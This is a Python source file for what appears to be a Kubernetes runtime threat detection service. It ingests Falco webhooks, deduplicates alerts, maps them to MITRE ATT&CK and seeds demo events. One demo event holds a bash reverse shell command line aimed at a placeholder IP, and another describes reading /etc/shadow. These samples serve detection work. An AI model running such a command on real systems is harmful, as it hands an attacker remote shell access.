"""CloudGuard Runtime Threat Detection Service.

Processes and validates incoming security webhooks from Falco / Falcosidekick.
Performs event deduplication, severity classification (CRITICAL, HIGH, MEDIUM, LOW, INFO),
attack mapping (MITRE ATT&CK), and tags provenance (live vs demo).
Provides querying, filtering, and incident escalation.
"""

import hashlib
import json
import logging
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional

from pydantic import BaseModel, Field

from app.schemas.provenance import determine_provenance, ProvenanceState

logger = logging.getLogger(__name__)


class FalcoWebhookPayload(BaseModel):
    """Schema for incoming Falco / Falcosidekick webhook payload."""
    rule: str
    priority: str = "Warning"
    output: str
    time: Optional[str] = None
    output_fields: Dict[str, Any] = Field(default_factory=dict)
    hostname: Optional[str] = "k8s-worker-node"
    tags: List[str] = Field(default_factory=list)


class RuntimeThreatEvent(BaseModel):
    id: str
    rule: str
    severity: str
    output: str
    timestamp: str
    container_id: Optional[str] = None
    container_name: Optional[str] = None
    image: Optional[str] = None
    namespace: Optional[str] = "default"
    pod: Optional[str] = None
    mitre_attack: Optional[str] = None
    provenance: Dict[str, Any]


class RuntimeThreatService:
    """Manages Falco runtime threat ingestion, deduplication, and event history."""

    SEVERITY_MAPPING = {
        "emergency": "CRITICAL",
        "alert": "CRITICAL",
        "critical": "CRITICAL",
        "error": "HIGH",
        "warning": "MEDIUM",
        "notice": "LOW",
        "info": "INFO",
        "debug": "INFO",
    }

    MITRE_RULE_MAPPINGS = {
        "Terminal shell in container": "Execution: Command and Scripting Interpreter (T1059)",
        "Write below etc": "Persistence: Boot or Logon Initialization Scripts (T1037)",
        "Read sensitive file untrusted": "Credential Access: OS Credential Dumping (T1003)",
        "Outbound connection to C2": "Command and Control: Ingress Tool Transfer (T1105)",
        "Privileged container spawned": "Privilege Escalation: Escape to Host (T1611)",
        "K8s Secret Accessed": "Credential Access: Credentials in Files (T1552)",
        "Cryptomining activity detected": "Impact: Resource Hijacking (T1496)",
    }

    def __init__(self):
        # In-memory storage for ingested events + deduplication cache
        self._events: List[Dict[str, Any]] = []
        self._dedup_cache: Dict[str, datetime] = {}
        self._initialize_demo_threats()

    def _initialize_demo_threats(self):
        """Pre-populates deterministic demo runtime events with DEMO provenance."""
        now = datetime.now(timezone.utc)
        demo_items = [
            {
                "rule": "Terminal shell in container",
                "priority": "Critical",
                "output": "Spawning bash process inside container payment-api (id: 4a2b91f0c)",
                "time": (now - timedelta(minutes=4)).isoformat(),
                "output_fields": {
                    "container.id": "4a2b91f0c29a",
                    "container.name": "payment-api",
                    "container.image.repository": "cloudguard/payment-api",
                    "k8s.ns.name": "production",
                    "k8s.pod.name": "payment-api-7b895fc69b-8k9pl",
                    "proc.name": "bash",
                    "proc.cmdline": "bash -i >& /dev/tcp/198.51.100.24/4444 0>&1"
                },
                "tags": ["mitre_execution", "container", "shell"],
                "hostname": "k8s-node-worker-01"
            },
            {
                "rule": "Read sensitive file untrusted",
                "priority": "Error",
                "output": "Sensitive file /etc/shadow opened for read by unprivileged process in user-auth",
                "time": (now - timedelta(minutes=18)).isoformat(),
                "output_fields": {
                    "container.id": "89ec9114ac2b",
                    "container.name": "user-auth",
                    "container.image.repository": "cloudguard/user-auth",
                    "k8s.ns.name": "production",
                    "k8s.pod.name": "user-auth-64b4c79878-mjk4l",
                    "fd.name": "/etc/shadow",
                    "proc.name": "cat"
                },
                "tags": ["mitre_credential_access", "compliance"],
                "hostname": "k8s-node-worker-02"
            },
            {
                "rule": "Privileged container spawned",
                "priority": "Warning",
                "output": "Container test-tool spawned with hostPID=true and privileged flags in default namespace",
                "time": (now - timedelta(minutes=45)).isoformat(),
                "output_fields": {
                    "container.id": "119ad581bcde",
                    "container.name": "debug-container",
                    "container.image.repository": "busybox:latest",
                    "k8s.ns.name": "default",
                    "k8s.pod.name": "debug-pod-9x",
                    "proc.name": "dockerd"
                },
                "tags": ["k8s", "privilege_escalation"],
                "hostname": "k8s-control-plane-01"
            }
        ]

        for item in demo_items:
            event = self._normalize_event(item, is_live=False)
            self._events.append(event)

    def _generate_fingerprint(self, rule: str, output: str, pod: Optional[str]) -> str:
        """Generates a stable MD5 fingerprint to prevent alert floods."""
        raw = f"{rule}::{output[:60]}::{pod or ''}"
        return hashlib.md5(raw.encode("utf-8")).hexdigest()

    def _normalize_event(self, data: Dict[str, Any], is_live: bool = False) -> Dict[str, Any]:
        """Maps Falco fields to unified CloudGuard Runtime Threat Schema."""
        rule = data.get("rule", "Unknown Falco Detection")
        priority = data.get("priority", "Warning").lower()
        severity = self.SEVERITY_MAPPING.get(priority, "MEDIUM")

        output = data.get("output", "")
        fields = data.get("output_fields", {}) or {}
        time_str = data.get("time") or datetime.now(timezone.utc).isoformat()

        pod = fields.get("k8s.pod.name") or fields.get("pod_name")
        container = fields.get("container.name") or fields.get("container_name")
        namespace = fields.get("k8s.ns.name") or fields.get("namespace", "default")
        image = fields.get("container.image.repository") or fields.get("image")
        container_id = fields.get("container.id")

        fingerprint = self._generate_fingerprint(rule, output, pod)
        event_id = f"evt_{fingerprint[:12]}"

        mitre_attack = None
        for key, attack_desc in self.MITRE_RULE_MAPPINGS.items():
            if key.lower() in rule.lower():
                mitre_attack = attack_desc
                break

        prov = determine_provenance(
            is_live_source=is_live,
            source_name="falcosidekick" if is_live else "cloudguard-demo-threats",
            ttl_seconds=300
        )

        return {
            "id": event_id,
            "rule": rule,
            "severity": severity,
            "output": output,
            "timestamp": time_str,
            "namespace": namespace,
            "pod": pod,
            "container": container,
            "container_id": container_id,
            "image": image,
            "mitre_attack": mitre_attack or "Execution: Lateral Movement Suspected (T1021)",
            "output_fields": fields,
            "tags": data.get("tags", []),
            "hostname": data.get("hostname", "k8s-node"),
            "provenance": prov.dict() if hasattr(prov, "dict") else prov.model_dump()
        }

    async def ingest_falco_event(self, payload: FalcoWebhookPayload) -> Dict[str, Any]:
        """Ingests live webhook from Falcosidekick with deduplication window."""
        rule = payload.rule
        output = payload.output
        pod = payload.output_fields.get("k8s.pod.name")

        fingerprint = self._generate_fingerprint(rule, output, pod)
        now = datetime.now(timezone.utc)

        # Check deduplication cache within 60-second window
        if fingerprint in self._dedup_cache:
            last_seen = self._dedup_cache[fingerprint]
            if (now - last_seen).total_seconds() < 60:
                logger.info(f"Duplicate runtime event suppressed for {rule} on {pod}")
                return {
                    "status": "deduplicated",
                    "fingerprint": fingerprint,
                    "rule": rule,
                    "message": "Duplicate event within 60-second suppression window."
                }

        self._dedup_cache[fingerprint] = now

        event = self._normalize_event(payload.dict() if hasattr(payload, "dict") else payload.model_dump(), is_live=True)
        self._events.insert(0, event)

        # Retain at most 500 events in memory
        if len(self._events) > 500:
            self._events.pop()

        return {
            "status": "ingested",
            "event_id": event["id"],
            "severity": event["severity"],
            "rule": event["rule"],
            "provenance": event["provenance"]["state"]
        }

    def list_threat_events(
        self,
        severity: Optional[str] = None,
        namespace: Optional[str] = None,
        search: Optional[str] = None,
        limit: int = 50
    ) -> Dict[str, Any]:
        """Queries detected runtime threats with search, filtering, and summary statistics."""
        filtered = self._events

        if severity and severity.upper() != "ALL":
            filtered = [e for e in filtered if e["severity"].upper() == severity.upper()]

        if namespace and namespace != "all":
            filtered = [e for e in filtered if e.get("namespace") == namespace]

        if search:
            q = search.lower()
            filtered = [
                e for e in filtered
                if q in e["rule"].lower() or q in e["output"].lower() or (e.get("pod") and q in e["pod"].lower())
            ]

        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for e in self._events:
            sev = e.get("severity", "MEDIUM").upper()
            if sev in severity_counts:
                severity_counts[sev] += 1

        paginated = filtered[:min(limit, 100)]

        # Determine overall provenance
        has_live = any(e.get("provenance", {}).get("state") == "live" for e in paginated)
        overall_prov = determine_provenance(
            is_live_source=has_live,
            source_name="falco-runtime-engine",
            ttl_seconds=300
        )

        return {
            "total": len(filtered),
            "summary": severity_counts,
            "events": paginated,
            "provenance": overall_prov.dict() if hasattr(overall_prov, "dict") else overall_prov.model_dump()
        }


runtime_threat_service = RuntimeThreatService()
